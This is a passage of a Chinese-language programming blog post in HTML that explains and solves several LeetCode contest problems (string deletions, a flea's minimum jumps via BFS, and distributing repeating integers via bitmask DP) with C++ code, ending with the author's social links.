class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumDeletions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnta(n+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            cnta[i] = cnta[i+<span class="number">1</span>] + (s[i] == <span class="string">'a'</span>?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ans = min(ans,cnta[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'b'</span>) curr++;</span><br><span class="line">            ans = min(ans,curr+cnta[i+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li>动态规划<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumDeletions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">int</span> cnta = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> cntb = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> dp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'a'</span>) dp = min(dp+<span class="number">1</span>,cntb);</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'b'</span>) cntb++;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = min(dp,ans);</span><br><span class="line">        dp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>;--i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'a'</span>) cnta++;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">'b'</span>) dp = min(dp+<span class="number">1</span>,cnta);</span><br><span class="line">        &#125;</span><br><span class="line">        ans = min(dp,ans);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5552-到家的最少跳跃次数"><a href="#5552-到家的最少跳跃次数" class="headerlink" title="5552. 到家的最少跳跃次数"></a>5552. 到家的最少跳跃次数</h2><p>有一只跳蚤的家在数轴上的位置 <code>x</code>处。请你帮助它从位置 <code>0</code> 出发，到达它的家。</p><p>跳蚤跳跃的规则如下：</p><ul><li>它可以 往前 跳恰好 a 个位置（即往右跳）。</li><li>它可以 往后 跳恰好 b 个位置（即往左跳）。</li><li>它不能 连续 往后跳 2 次。</li><li>它不能跳到任何 <code>forbidden</code> 数组中的位置。<br>跳蚤可以往前跳 超过 它的家的位置，但是它 不能跳到负整数 的位置。</li></ul><p>给你一个整数数组 <code>forbidden</code> ，其中 <code>forbidden[i]</code>是跳蚤不能跳到的位置，同时给你整数 a， b 和 x ，请你返回跳蚤到家的最少跳跃次数。如果没有恰好到达 x 的可行方案，请你返回 -1 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：forbidden = [<span class="number">14</span>,<span class="number">4</span>,<span class="number">18</span>,<span class="number">1</span>,<span class="number">15</span>], a = <span class="number">3</span>, b = <span class="number">15</span>, x = <span class="number">9</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：往前跳 <span class="number">3</span> 次（<span class="number">0</span> -&gt; <span class="number">3</span> -&gt; <span class="number">6</span> -&gt; <span class="number">9</span>），跳蚤就到家了。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：forbidden = [<span class="number">8</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">20</span>], a = <span class="number">15</span>, b = <span class="number">13</span>, x = <span class="number">11</span></span><br><span class="line">输出：<span class="number">-1</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：forbidden = [<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">4</span>], a = <span class="number">16</span>, b = <span class="number">9</span>, x = <span class="number">7</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：往前跳一次（<span class="number">0</span> -&gt; <span class="number">16</span>），然后往回跳一次（<span class="number">16</span> -&gt; <span class="number">7</span>），跳蚤就到家了。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= forbidden.length &lt;= 1000</code></li><li><code>1 &lt;= a, b, forbidden[i] &lt;= 2000</code></li><li><code>0 &lt;= x &lt;= 2000</code></li><li><code>forbidden</code> 中所有位置互不相同。</li><li>位置 x 不在 <code>forbidden</code> 中。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-jumps-to-reach-home" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-jumps-to-reach-home</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> BFS</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>常规的BFS即可解决，我们每次记录上一次的跳跃方向，如果上次跳跃的方向为往右跳，则本次既可以往左跳，也可以往右跳；如果上次跳跃的方向为向左跳，则本次只能往右跳。</li><li>采用层次遍历的方式<code>bfs</code>即可快速到底目标点即可。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>贪心算法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10000</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumJumps</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; forbidden, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = forbidden.size();</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; fb;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; visit(MAXN,<span class="literal">false</span>);        </span><br><span class="line">        <span class="keyword">if</span>(x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : forbidden) fb.insert(v);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*intial*/</span></span><br><span class="line">        <span class="built_in">queue</span>&lt;pii&gt; qu;</span><br><span class="line">        qu.push(&#123;<span class="number">0</span>,LEFT&#125;);</span><br><span class="line">        visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> step = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!qu.empty())&#123;</span><br><span class="line">            <span class="keyword">int</span> sz = qu.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i)&#123;</span><br><span class="line">                pii curr = qu.front();</span><br><span class="line">                qu.pop();</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(curr.first == x) <span class="keyword">return</span> step;</span><br><span class="line">                <span class="keyword">if</span>(curr.second == LEFT)&#123;</span><br><span class="line">                    <span class="comment">/*jump right*/</span></span><br><span class="line">                    <span class="keyword">if</span>(curr.first+a &lt;= MAXN &amp;&amp; !fb.count(curr.first+a) &amp;&amp; !visit[curr.first+a])&#123;</span><br><span class="line">                        visit[curr.first+a] = <span class="literal">true</span>;</span><br><span class="line">                        qu.push(&#123;curr.first+a,RIGHT&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(curr.second == RIGHT)&#123;</span><br><span class="line">                    <span class="comment">/*jump left*/</span></span><br><span class="line">                    <span class="keyword">if</span>(curr.first-b &gt;= <span class="number">0</span> &amp;&amp; !fb.count(curr.first-b) &amp;&amp; !visit[curr.first-b])&#123;</span><br><span class="line">                        visit[curr.first-b] = <span class="literal">true</span>;</span><br><span class="line">                        qu.push(&#123;curr.first-b,LEFT&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/*jump right*/</span></span><br><span class="line">                    <span class="keyword">if</span>(curr.first+a &lt;= MAXN &amp;&amp; !fb.count(curr.first+a) &amp;&amp; !visit[curr.first+a])&#123;</span><br><span class="line">                        visit[curr.first+a] = <span class="literal">true</span>;</span><br><span class="line">                        qu.push(&#123;curr.first+a,RIGHT&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5553-分配重复整数"><a href="#5553-分配重复整数" class="headerlink" title="5553. 分配重复整数"></a>5553. 分配重复整数</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个长度为 n 的整数数组 <code>nums</code>，这个数组中至多有 <code>50</code>个不同的值。同时你有 m 个顾客的订单 <code>quantity</code> ，其中，整数 <code>quantity[i]</code>是第 i 位顾客订单的数目。请你判断是否能将 <code>nums</code>中的整数分配给这些顾客，且满足：</p><ul><li>第 <code>i</code>位顾客 恰好 有<code>quantity[i]</code> 个整数。</li><li>第 <code>i</code> 位顾客拿到的整数都是 相同的 。</li><li>每位顾客都满足上述两个要求。<br>如果你可以分配 <code>nums</code> 中的整数满足上面的要求，那么请返回 <code>true</code> ，否则返回 <code>false</code> 。</li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], quantity = [<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客没办法得到两个相同的整数。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>], quantity = [<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客得到 [<span class="number">3</span>,<span class="number">3</span>] 。整数 [<span class="number">1</span>,<span class="number">2</span>] 都没有被使用。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>], quantity = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客得到 [<span class="number">1</span>,<span class="number">1</span>] ，第 <span class="number">1</span> 位顾客得到 [<span class="number">2</span>,<span class="number">2</span>] 。</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], quantity = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：尽管第 <span class="number">0</span> 位顾客可以得到 [<span class="number">1</span>,<span class="number">1</span>] ，第 <span class="number">1</span> 位顾客没法得到 <span class="number">2</span> 个一样的整数。</span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>], quantity = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：第 <span class="number">0</span> 位顾客得到 [<span class="number">1</span>,<span class="number">1</span>] ，第 <span class="number">1</span> 位顾客得到 [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>] 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>1 &lt;= n &lt;= 10^5</code></li><li><code>1 &lt;= nums[i] &lt;= 1000</code></li><li><code>m == quantity.length</code></li><li><code>1 &lt;= m &lt;= 10</code></li><li><code>1 &lt;= quantity[i] &lt;= 105</code></li><li><code>nums</code> 中至多有 <code>50</code> 个不同的数字。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/distribute-repeating-integers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/distribute-repeating-integers</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划状态压缩<code>dp</code></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们设动态规划的递推公式为在<code>dp[i][j] = true</code>,表示前<code>i</code>个数，能够满足二进制掩码状态<code>j</code>表示的订单。</li><li>则我们需要假设已经<code>dp[i][j]</code> 为<code>true</code>，则我们当遍历第<code>i+1</code>个数时，则我们知道剩余的未满足的订单的集合为<code>k = (~j)&amp;mask</code>,我们在该状态子空间中进行遍历，遍历所有该集合的状态子空间，我们设<code>k</code>的子状态为<code>t</code>,如果第<code>i+1</code>数的个数为<code>arr[i]</code>，子状态<code>t</code>中包含的订单总数为<code>count[t]</code>，如果满足<code>arr[i+1] &gt;= count[t]</code>则表示我们可以用第<code>i+1</code>个数表示子状态<code>t</code>.<script type="math/tex; mode=display">dp[i+1][j|t_{k}] = dp[i][j] \qquad (if \quad arr[i+1] > count[t_{k}])</script></li><li>难点在于枚举子集，需要一点技巧，以下为常用的技巧，这个与<a href="https://leetcode-cn.com/problems/count-subtrees-with-max-distance-between-cities/" target="_blank" rel="noopener">统计子树中城市之间最大距离</a>很像，如果解决状态压缩的题目，需要熟练掌握这个非常重要的技巧。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = k ; i != <span class="number">0</span>; i = (i<span class="number">-1</span>)&amp;k)&#123;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>这道题目非常有意思的如何计算时间复杂度。<br>我们知道需要从$0…(2^{n}-1)$之间枚举其所有的子集，实际上可以等同于如下计算公式，我们利用二项式定理：  <script type="math/tex; mode=display">O(N) = n*\sum_{i=0}^{m}C_{m}^{i}*2^{i} \\ = n*\sum_{i=0}^{m}C_{m}^{i}*1^{m-i}*2^{i}  \\= n*(2+1)^{m} \\= n*3^{m}</script></li></ol><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canDistribute</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; quantity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> m = quantity.size();</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;m) - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; freq;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; count(<span class="number">1</span>&lt;&lt;m,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt;&gt; dp(<span class="number">51</span>,<span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt;(<span class="number">1100</span>,<span class="literal">false</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums) freq[v]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : freq) arr.push_back(v.second);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= mask; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; m; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    sum += quantity[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count[i] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= arr.size(); ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= mask; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!dp[i<span class="number">-1</span>][j]) <span class="keyword">continue</span>;</span><br><span class="line">                dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">int</span> curr = (j^mask);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = curr; k != <span class="number">0</span>; k = (k<span class="number">-1</span>)&amp;curr)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(arr[i<span class="number">-1</span>] &gt;= count[k])&#123;</span><br><span class="line">                        dp[i][j|k] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[arr.size()][mask];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>dfs<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> idx,<span class="keyword">int</span> mask,<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; &amp; visit,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; arr,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; count)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= arr.size()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : visit)&#123;</span><br><span class="line">            <span class="keyword">int</span> tot = v^mask;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = tot; i != <span class="number">0</span>; i = (i<span class="number">-1</span>)&amp;tot)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[idx] &gt;= count[i]) visit.insert(v|i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(visit.count(mask)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(idx+<span class="number">1</span>,mask,visit,arr,count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canDistribute</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; quantity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> m = quantity.size();</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;m) - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; freq;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; count(<span class="number">1</span>&lt;&lt;m,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; visit;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums) freq[v]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : freq) arr.push_back(v.second);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= mask; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; m; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    sum += quantity[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count[i] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        visit.insert(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>,mask,visit,arr,count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
